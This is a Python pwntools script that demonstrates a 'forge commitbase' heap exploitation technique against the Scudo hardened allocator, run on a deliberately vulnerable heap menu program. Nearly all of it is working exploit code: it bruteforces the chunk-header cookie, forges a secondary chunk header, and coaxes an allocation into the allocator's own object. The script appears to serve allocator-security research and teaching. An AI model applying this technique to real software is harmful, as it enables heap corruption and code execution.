#!/usr/bin/python3
from pwn import *
from utils import *
from scudocookie import bruteforce, calc_checksum

elf = context.binary = ELF("malloc-menu-linux/malloc-menu-linux")

gs = '''
source ../gdb-plugin/scudo-19e6d541889f.py
b *0x4017ac
'''

SCUDO_LIB = os.path.realpath("malloc-menu-linux/libscudo-linux-latest.so") 
LIBS = os.path.realpath("malloc-menu-linux/libs")
LD = os.path.join(LIBS, "ld-linux-x86-64.so.2")
env = {"LD_PRELOAD": SCUDO_LIB, "LD_LIBRARY_PATH": LIBS}

if args.NOSCUDO:
    env = {}
elif args.QUARANTINE:
    env["SCUDO_OPTIONS"] = ":".join([
        "thread_local_quarantine_size_kb=5",
        "quarantine_size_kb=10",
        "quarantine_max_chunk_size=2048",
        "release_to_os_interval_ms=-1"
    ])

    
def start():
    return process([LD, elf.path], env=env, stdin=PTY)
   
io = start()

if args["GDB"]:
    gdb.attach(io, gdbscript=gs)


info("this script demonstrates the forge commitbase technique, exploiting a simple heap menu program (malloc-menu-linux)")

info("first we allocate a victim chunk")
ind, victim_chunk = malloc(io, 24, b"Y"*24)
info(f"victim chunk address {hex(victim_chunk)}")

scudo_base = get_libscudo_base(io, SCUDO_LIB)
fake_commit_base = scudo_base + 0x36000 # adjust for how it gets allocated from commitbase
info(f"our plan is to coax scudo into allocating a chunk into the Scudo Allocator object at {hex(fake_commit_base)}")
warn(f"target address: {hex(fake_commit_base)}")

info("assuming we have the tools to leak the cookie, we calculate it here")
cookie = bruteforce_cookie(io, victim_chunk)
info(f"bruteforced cookie: {hex(cookie)}")

# change classId of the chunk to 0
new_header = 0x8100
new_header = create_header(0, 8, 1)
forged_header = forge_header(victim_chunk, cookie, new_header)

# start of the secondary chunk header
largechunk_start = victim_chunk-0x40

# allocate one secondary chunk so the secondary free list is initialized
malloc(io, 0x100000) 

info(f"now we forge our fake secondary chunk starting at {hex(largechunk_start)}")
fake_commit_size = 0x30000
write(io, largechunk_start, p64(0x0)) #prev 
write(io, largechunk_start+0x8, p64(0x0)) #next
write(io, largechunk_start+0x10, p64(fake_commit_base-0x1000)) # CommitBase
write(io, largechunk_start+0x18, p64(fake_commit_size)) # CommitSize
write(io, largechunk_start+0x20, p64(fake_commit_base-0x1000)) # MapBase
write(io, largechunk_start+0x28, p64(fake_commit_size)) #MapSize
write(io, largechunk_start+0x30, forged_header) # ClassId 0 Header

info(f"we free the chunk and put our target address into the secondary chunk free list")
free(io, victim_chunk)

warn("by allocating a secondary chunk with similar size we get a chunk allocated at our desired address")
idx, addr = malloc(io, fake_commit_size-0x1000)

warn(f'fake secondary chunk allocated at {hex(addr)}') 

# =============================================================================

io.interactive()
# create perclass structure in the following perclass structure
